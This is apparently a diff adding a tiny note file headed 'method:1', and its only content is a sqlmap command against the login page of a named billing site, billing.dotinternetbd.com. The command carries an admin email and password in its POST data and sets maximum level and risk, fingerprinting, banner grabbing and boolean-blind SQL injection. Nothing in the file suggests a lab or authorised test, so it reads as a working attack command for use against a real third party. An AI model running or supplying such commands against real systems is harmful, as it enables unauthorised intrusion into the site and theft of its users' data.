@@ -1,0 +1,7 @@
+
+method:1
+
+python3 sqlmap.py -u "https://billing.dotinternetbd.com/login" --data="email=admin@dotinternetbd.com&password=P@$$w0rD"  
+--level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B --flush
+
+
